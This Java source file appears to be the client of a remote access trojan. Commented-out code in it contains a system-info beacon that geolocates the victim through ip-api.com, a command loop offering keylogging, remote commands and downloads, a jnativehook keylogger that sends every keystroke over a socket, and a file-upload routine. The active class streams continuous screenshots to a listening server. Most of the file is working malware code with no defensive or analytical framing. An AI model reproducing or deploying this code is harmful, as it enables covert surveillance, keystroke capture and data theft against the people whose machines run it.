package com.rattest.client;
// Client2 class that
// sends data and receives also
  
import java.io.*;
import java.net.*;
import java.net.http.*;
import com.github.kwhat.jnativehook.*;
import com.github.kwhat.jnativehook.dispatcher.*;
import com.github.kwhat.jnativehook.keyboard.*;
import com.github.kwhat.jnativehook.mouse.*;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.MouseInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
/*
class Clienttest implements NativeKeyListener,NativeMouseListener,NativeMouseMotionListener,NativeMouseWheelListener{
    Socket socket;
    DataInputStream input;
    DataOutputStream out;
    String keyLogKey;
    public Clienttest(){
        try {
            socket = new Socket("localhost", 304);
            System.out.println("Connected");
 
            // takes input from terminal
            input = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
 
            // sends output to the socket
            out = new DataOutputStream(
                socket.getOutputStream());
        }
        catch (Exception e) {
            System.out.println(e);
        }
        try{
            String pcName=InetAddress.getLocalHost().getHostName();
            String os=System.getProperty("os.name");
            String port="304";
            String[] country,ip;
            HttpClient browser=HttpClient.newHttpClient();
            HttpRequest req=HttpRequest.newBuilder(new URI("http://ip-api.com/json/")).build();
            HttpResponse<String> res=browser.send(req,HttpResponse.BodyHandlers.ofString());
            country=(res.body()).split(".*?country\":\"|\",\"countryCode.*");
            ip=(res.body()).split(".*?query\":\"|\".*");
            String[] sysInfo={country[1],pcName,os,ip[1],port};
            out.writeUTF(sysInfo[0]+","+sysInfo[1]+","+sysInfo[2]+","+sysInfo[3]+","+sysInfo[4]);
        }catch(Exception e){
            
        }
        String cmd;
        while (true) {
            try {
                cmd = input.readUTF();
                System.out.println(cmd);
                if(cmd.equals("RDP")){
                    out.writeUTF("RDP");
                }
                if(cmd.equals("KeyLogger")){
                    keylog();
                }
                if(cmd.equals("Execute commands")){
                    out.writeUTF("Execute commands");
                }
                if(cmd.equals("Download")){
                    out.writeUTF("Download");
                }
                if(cmd.equals("Execute programs")){
                    out.writeUTF("Execute programs");
                }
            }
            catch (IOException i) {
                System.out.println(i);
            }
        }
    }
    public void keylog(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {

        }
        GlobalScreen.addNativeKeyListener(this);
    }
    public void nativeKeyPressed(NativeKeyEvent e) {
        try{
            out.writeUTF(NativeKeyEvent.getKeyText(e.getKeyCode()));
        }catch(Exception except){
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
            // Nothing
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
            // Nothing here
    }
    public void nativeMouseClicked(NativeMouseEvent e) { 
        System.out.println(e.paramString());
    }

    public void nativeMousePressed(NativeMouseEvent e) { 
        System.out.println(e.paramString());
    }

    public void nativeMouseReleased(NativeMouseEvent e) { 
        System.out.println(e.paramString());
    }

    public void nativeMouseMoved(NativeMouseEvent e) {
        System.out.println(e.paramString());
    }

    public void nativeMouseDragged(NativeMouseEvent e) {
        System.out.println(e.paramString());
    }

    public void nativeMouseWheelMoved(NativeMouseWheelEvent e) {
        System.out.println(e.paramString());
    }
    public static void main(String args[]){
        new Clienttest();
     }
}*//*
class Clienttest{
    Socket response;
    DataInputStream in;
    DataOutputStream out;
    public Clienttest(){
        try {
            response=new Socket("localhost",1010);
            in=new DataInputStream(response.getInputStream());
            out=new DataOutputStream(response.getOutputStream());
            InputStream readFile=new FileInputStream("C:\\rdp\\downloads\\downloads.zip");
            int count;
            byte[] buffer = new byte[8192];
            while ((count = readFile.read(buffer)) > 0)
            {
              out.write(buffer, 0, count);
            }
            out.writeUTF("Working on Client");
        }catch(SocketException sex){
        }
        catch (IOException ex) {
            System.out.println(ex);
        }
        
    }
    public static void main(String[] args){
        new Clienttest();
    }
}*/
class Clienttest{
    Socket response;
    DataInputStream in;
    BufferedImage screen=null;
    Image fScreen=null;
    DataOutputStream out;
    public Clienttest(){
        try {
            response=new Socket("localhost",1010);
            in=new DataInputStream(response.getInputStream());
            out=new DataOutputStream(response.getOutputStream());
            while(true){
                try{
                    Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                    screen = new Robot().createScreenCapture(
                            new Rectangle(new Dimension(screenSize.width, screenSize.height)));
                    int x = MouseInfo.getPointerInfo().getLocation().x;
                    int y = MouseInfo.getPointerInfo().getLocation().y;

                    Graphics2D graphics2D = screen.createGraphics();
                    //graphics2D.drawImage(image, x, y, 20,30, null);
                    graphics2D.setColor(Color.RED);
                    graphics2D.fillOval(x, y, 10, 10);
                    graphics2D.drawOval(x, y, 10,10);
                    ImageIO.write(screen, "jpg", out);
                }catch(Exception e){System.out.println(e);}
            }
        }catch(SocketException sex){
        }
        catch (IOException ex) {
            System.out.println(ex);
        }
        
    }
    public static void main(String[] args){
        new Clienttest();
    }
}
        